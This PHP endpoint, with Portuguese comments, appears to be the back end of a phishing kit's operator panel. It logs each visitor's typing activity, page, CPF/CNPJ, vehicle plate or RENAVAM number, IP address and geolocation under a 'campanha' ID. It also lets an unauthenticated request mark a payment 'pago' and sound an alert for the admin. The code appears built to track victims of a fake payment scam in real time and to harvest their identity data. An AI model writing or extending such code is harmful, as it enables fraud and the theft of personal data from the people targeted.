<?php
require '../db.php';
require_once '../base/utility.php';
date_default_timezone_set('America/Sao_Paulo');

header('Content-Type: application/json');

$user_id = $_COOKIE['user_id'] ?? null;
$id_usuario = (int)($_COOKIE['campanha'] ?? 0);
$identity = $_COOKIE['Identity'] ?? 'desconhecido';
$action = $_GET['action'] ?? 'typing';
$ref = $_GET['ref'] ?? null;
$rawInput = file_get_contents('php://input');
$payload = json_decode($rawInput, true);
$page = $payload['tela'] ?? $payload['page'] ?? null;
$doc = $payload['doc'] ?? $payload['cnpj'] ?? $payload['cpf_cnpj'] ?? $payload['placa'] ?? $payload['renavam'] ?? null;

if (!$page && !empty($_SERVER['HTTP_REFERER'])) {
    $refererPath = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_PATH) ?: '';
    $refererPath = trim($refererPath, '/');
    if ($refererPath !== '') {
        $segments = explode('/', $refererPath);
        $page = end($segments) ?: null;
    }
}

if (!$page) {
    $page = 'typing';
}

if (!$user_id && $action !== 'confirm_payment') {
    http_response_code(401);
    echo json_encode(['error' => 'Usuário não autenticado']);
    exit;
}

try {
    if ($action === 'confirm_payment' && $ref) {
        // 1. Atualiza o status da transação para 'pago'
        $updateData = $pdo->prepare("UPDATE table_data SET status = 'pago' WHERE id = ? OR ref = ?");
        $updateData->execute([$ref, $ref]);

        // 2. Dispara alerta sonoro de sucesso (ID 4) no painel para o admin
        $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio, atual = :atual, hora = :hora WHERE id = :id");
        $updateStmt->execute([
            ':audio' => 4, // Som de sucesso/pagamento
            ':atual' => rand(100000000, 99999999999),
            ':hora'  => date('Y-m-d H:i:s'),
            ':id'    => 1
        ]);
        
        echo json_encode(['success' => true, 'message' => 'Status atualizado e notificação enviada']);
        exit;
    }

    $check = $pdo->prepare("SELECT id FROM typing_status WHERE user_id = ?");
    $check->execute([$user_id]);
    $exists = $check->fetchColumn();

    if ($exists) {
        $update = $pdo->prepare("UPDATE typing_status SET typing_at = NOW() WHERE user_id = ?");
        $update->execute([$user_id]);
    } else {
        $insert = $pdo->prepare("INSERT INTO typing_status (user_id, typing_at) VALUES (?, NOW())");
        $insert->execute([$user_id]);
    }

    $ip = getClientIp();
    $ipInfo = getFromIp($ip);
    $pais = $ipInfo->country ?? 'Desconhecido';
    $povedor = $ipInfo->isp ?? $ipInfo->org ?? $ipInfo->as ?? 'Desconhecido';
    $region = $ipInfo->region ?? $ipInfo->regionName ?? 'No';
    $city = $ipInfo->city ?? 'No';
    $localidade = $city . ' - ' . $region . ' - ' . $pais;

    $hora = date('Y-m-d H:i:s');
    $loginInfo = json_encode([
        ['label' => 'Origem', 'value' => $page],
        ['label' => 'Doc', 'value' => $doc ?? 'N/A']
    ], JSON_UNESCAPED_UNICODE);

    $recentLogin = $pdo->prepare("
        SELECT id FROM logins
        WHERE id_usuario = :id_usuario
          AND page = :page
          AND ip = :ip
          AND pais = :pais
          AND hora >= (NOW() - INTERVAL 20 SECOND)
        ORDER BY id DESC
        LIMIT 1
    ");
    $recentLogin->execute([
        ':id_usuario' => $id_usuario,
        ':page' => $page,
        ':ip' => $ip,
        ':pais' => $localidade
    ]);
    $existingLoginId = $recentLogin->fetchColumn();

    if (!$existingLoginId) {
        $insertLogin = $pdo->prepare("
            INSERT INTO logins (page, dados, debitos, ip, pais, identity, hora, login_info, id_usuario, resposta)
            VALUES (:page, :dados, :debitos, :ip, :pais, :identity, :hora, :login_info, :id_usuario, :resposta)
        ");
        $insertLogin->execute([
            ':page' => $page,
            ':dados' => 'Typing iniciado',
            ':debitos' => '0 / 0',
            ':ip' => $ip,
            ':pais' => $localidade,
            ':identity' => $identity,
            ':hora' => $hora,
            ':login_info' => $loginInfo,
            ':id_usuario' => $id_usuario,
            ':resposta' => ''
        ]);
    }

    echo json_encode([
        'success' => true,
        'hora' => date('Y-m-d H:i:s')
    ]);

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['error' => $e->getMessage()]);
}
